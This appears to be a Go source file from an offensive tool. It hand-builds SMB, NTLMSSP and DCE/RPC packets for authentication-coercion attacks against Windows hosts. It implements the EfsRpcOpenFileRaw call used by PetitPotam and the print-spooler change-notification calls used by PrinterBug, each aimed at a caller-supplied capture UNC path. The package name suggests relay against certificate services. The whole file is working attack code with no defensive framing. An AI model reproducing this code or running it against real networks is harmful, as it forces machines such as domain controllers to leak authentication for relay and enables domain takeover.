package pki

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
)

func smbPacket(header, body []byte) []byte {
	totalLen := len(header) + len(body)
	nb := make([]byte, 4)
	nb[0] = 0x00
	nb[1] = byte(totalLen >> 16)
	nb[2] = byte(totalLen >> 8)
	nb[3] = byte(totalLen)
	pkt := append(nb, header...)
	pkt = append(pkt, body...)
	return pkt
}

func readSMB2Response(conn net.Conn) ([]byte, error) {
	nb := make([]byte, 4)
	if _, err := readFull(conn, nb); err != nil {
		return nil, fmt.Errorf("read NetBIOS header: %w", err)
	}
	length := int(nb[1])<<16 | int(nb[2])<<8 | int(nb[3])
	if length <= 0 || length > 65536 {
		return nil, fmt.Errorf("invalid SMB response length: %d", length)
	}

	data := make([]byte, length)
	if _, err := readFull(conn, data); err != nil {
		return nil, fmt.Errorf("read SMB response: %w", err)
	}

	if len(data) >= 12 {
		status := binary.LittleEndian.Uint32(data[8:12])
		if status != 0 && status != 0xC0000016 {
			return data, fmt.Errorf("SMB status 0x%08X", status)
		}
	}

	return data, nil
}

func readFull(conn net.Conn, buf []byte) (int, error) {
	total := 0
	for total < len(buf) {
		n, err := conn.Read(buf[total:])
		total += n
		if err != nil {
			return total, err
		}
	}
	return total, nil
}

func coerceUTF16LE(s string) []byte {
	runes := []rune(s)
	out := make([]byte, 0, len(runes)*2+2)
	for _, r := range runes {
		if r <= 0xFFFF {
			out = append(out, byte(r), byte(r>>8))
		}
	}
	return out
}

func appendLE32(b []byte, v uint32) []byte {
	return append(b, byte(v), byte(v>>8), byte(v>>16), byte(v>>24))
}

func buildNTLMSSPNegotiate() []byte {
	msg := make([]byte, 32)
	copy(msg[0:8], []byte("NTLMSSP\x00"))
	binary.LittleEndian.PutUint32(msg[8:12], 1)
	binary.LittleEndian.PutUint32(msg[12:16], 0x00088207)
	return msg
}

func buildNTLMSSPAuth() []byte {
	const fixedLen = 88
	msg := make([]byte, fixedLen)
	copy(msg[0:8], []byte("NTLMSSP\x00"))
	binary.LittleEndian.PutUint32(msg[8:12], 3)
	offsets := []int{12, 20, 28, 36, 44, 52}
	for _, off := range offsets {
		binary.LittleEndian.PutUint16(msg[off:off+2], 0)
		binary.LittleEndian.PutUint16(msg[off+2:off+4], 0)
		binary.LittleEndian.PutUint32(msg[off+4:off+8], fixedLen)
	}
	binary.LittleEndian.PutUint32(msg[60:64], 0x00088203)
	return msg
}

func rpcBind(s *smbSession, interfaceUUID [16]byte) error {
	callID := rand.Uint32()
	ctxList := make([]byte, 48)
	ctxList[0] = 1
	ctxList[6] = 1
	copy(ctxList[8:24], interfaceUUID[:])
	binary.LittleEndian.PutUint16(ctxList[24:26], 1)
	ndr := [16]byte{0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60}
	copy(ctxList[28:44], ndr[:])
	binary.LittleEndian.PutUint32(ctxList[44:48], 2)

	bindBody := make([]byte, 8)
	binary.LittleEndian.PutUint16(bindBody[0:2], 4280)
	binary.LittleEndian.PutUint16(bindBody[2:4], 4280)
	bindBody = append(bindBody, ctxList...)

	fragLen := uint16(16 + len(bindBody))
	hdr := make([]byte, 16)
	hdr[0] = 5
	hdr[2] = 0x0B
	hdr[3] = 0x03
	hdr[4] = 0x10
	binary.LittleEndian.PutUint16(hdr[8:10], fragLen)
	binary.LittleEndian.PutUint32(hdr[12:16], callID)

	var bind []byte
	bind = append(bind, hdr...)
	bind = append(bind, bindBody...)

	if err := s.writePipe(bind); err != nil {
		return err
	}
	_, err := s.readPipe()
	return err
}

func efsRpcOpenFileRaw(s *smbSession, uncPath string) error {
	callID := rand.Uint32()
	pathUTF16 := coerceUTF16LE(uncPath)
	pathWords := len(pathUTF16)/2 + 1

	var stub []byte
	stub = append(stub, make([]byte, 20)...)
	stub = appendLE32(stub, uint32(pathWords))
	stub = appendLE32(stub, 0)
	stub = appendLE32(stub, uint32(pathWords))
	stub = append(stub, pathUTF16...)
	stub = append(stub, 0, 0)
	for len(stub)%4 != 0 {
		stub = append(stub, 0)
	}
	stub = appendLE32(stub, 0)

	reqHdr := make([]byte, 8)
	binary.LittleEndian.PutUint32(reqHdr[0:4], uint32(len(stub)))
	binary.LittleEndian.PutUint16(reqHdr[6:8], 0)

	fragLen := uint16(16 + len(reqHdr) + len(stub))
	hdr := make([]byte, 16)
	hdr[0] = 5
	hdr[2] = 0x00
	hdr[3] = 0x03
	hdr[4] = 0x10
	binary.LittleEndian.PutUint16(hdr[8:10], fragLen)
	binary.LittleEndian.PutUint32(hdr[12:16], callID)

	var rpcReq []byte
	rpcReq = append(rpcReq, hdr...)
	rpcReq = append(rpcReq, reqHdr...)
	rpcReq = append(rpcReq, stub...)

	if err := s.writePipe(rpcReq); err != nil {
		return err
	}
	_, readErr := s.readPipe()
	if readErr != nil {
		return readErr
	}
	return nil
}

func extractRPCFromReadResponse(resp []byte) ([]byte, error) {
	if len(resp) < 64+16 {
		return nil, fmt.Errorf("response too short")
	}
	dataLen := binary.LittleEndian.Uint32(resp[64+4 : 64+8])
	if int(64+16+dataLen) > len(resp) {
		return nil, fmt.Errorf("invalid RPC data length")
	}
	return resp[80 : 80+dataLen], nil
}

func rpcOpenPrinterEx(s *smbSession, printerName string) ([]byte, error) {
	callID := rand.Uint32()
	var stub []byte
	nameUTF16 := coerceUTF16LE(printerName)
	nameChars := uint32(len(nameUTF16)/2 + 1)
	stub = appendLE32(stub, 0x00020000)
	stub = appendLE32(stub, nameChars)
	stub = appendLE32(stub, 0)
	stub = appendLE32(stub, nameChars)
	stub = append(stub, nameUTF16...)
	stub = append(stub, 0, 0)
	for len(stub)%4 != 0 {
		stub = append(stub, 0)
	}
	stub = appendLE32(stub, 0)
	stub = appendLE32(stub, 0)
	stub = appendLE32(stub, 0)
	stub = appendLE32(stub, 0x00000008)
	stub = appendLE32(stub, 1)
	stub = appendLE32(stub, 1)
	stub = appendLE32(stub, 0x00020004)
	stub = appendLE32(stub, 60)
	stub = appendLE32(stub, 0x00020008)
	stub = appendLE32(stub, 0x0002000C)
	stub = appendLE32(stub, 7601)
	stub = appendLE32(stub, 6)
	stub = appendLE32(stub, 1)
	stub = append(stub, 9, 0, 0, 0)
	machineUTF16 := coerceUTF16LE(`\\`)
	machineChars := uint32(len(machineUTF16)/2 + 1)
	stub = appendLE32(stub, machineChars)
	stub = appendLE32(stub, 0)
	stub = appendLE32(stub, machineChars)
	stub = append(stub, machineUTF16...)
	stub = append(stub, 0, 0)
	for len(stub)%4 != 0 {
		stub = append(stub, 0)
	}
	stub = appendLE32(stub, machineChars)
	stub = appendLE32(stub, 0)
	stub = appendLE32(stub, machineChars)
	stub = append(stub, machineUTF16...)
	stub = append(stub, 0, 0)
	for len(stub)%4 != 0 {
		stub = append(stub, 0)
	}

	reqHdr := make([]byte, 8)
	binary.LittleEndian.PutUint32(reqHdr[0:4], uint32(len(stub)))
	binary.LittleEndian.PutUint16(reqHdr[6:8], 69)
	fragLen := uint16(16 + len(reqHdr) + len(stub))
	hdr := make([]byte, 16)
	hdr[0] = 5
	hdr[2] = 0x00
	hdr[3] = 0x03
	hdr[4] = 0x10
	binary.LittleEndian.PutUint16(hdr[8:10], fragLen)
	binary.LittleEndian.PutUint32(hdr[12:16], callID)
	var rpcReq []byte
	rpcReq = append(rpcReq, hdr...)
	rpcReq = append(rpcReq, reqHdr...)
	rpcReq = append(rpcReq, stub...)
	if err := s.writePipe(rpcReq); err != nil {
		return nil, err
	}
	resp, err := s.readPipe()
	if err != nil {
		return nil, err
	}
	return parseOpenPrinterExResponse(resp)
}

func rpcFindFirstPrinterChangeNotificationEx(s *smbSession, handle []byte, captureUNC string) error {
	callID := rand.Uint32()
	var stub []byte
	stub = append(stub, handle...)
	stub = appendLE32(stub, 0x00000100)
	stub = appendLE32(stub, 0)
	uncUTF16 := coerceUTF16LE(captureUNC)
	uncChars := uint32(len(uncUTF16)/2 + 1)
	stub = appendLE32(stub, 0x00020000)
	stub = appendLE32(stub, uncChars)
	stub = appendLE32(stub, 0)
	stub = appendLE32(stub, uncChars)
	stub = append(stub, uncUTF16...)
	stub = append(stub, 0, 0)
	for len(stub)%4 != 0 {
		stub = append(stub, 0)
	}
	stub = appendLE32(stub, 0)
	stub = appendLE32(stub, 0)
	reqHdr := make([]byte, 8)
	binary.LittleEndian.PutUint32(reqHdr[0:4], uint32(len(stub)))
	binary.LittleEndian.PutUint16(reqHdr[6:8], 65)
	fragLen := uint16(16 + len(reqHdr) + len(stub))
	hdr := make([]byte, 16)
	hdr[0] = 5
	hdr[2] = 0x00
	hdr[3] = 0x03
	hdr[4] = 0x10
	binary.LittleEndian.PutUint16(hdr[8:10], fragLen)
	binary.LittleEndian.PutUint32(hdr[12:16], callID)
	var rpcReq []byte
	rpcReq = append(rpcReq, hdr...)
	rpcReq = append(rpcReq, reqHdr...)
	rpcReq = append(rpcReq, stub...)
	if err := s.writePipe(rpcReq); err != nil {
		return err
	}
	_, readErr := s.readPipe()
	if readErr != nil {
		return readErr
	}
	return nil
}
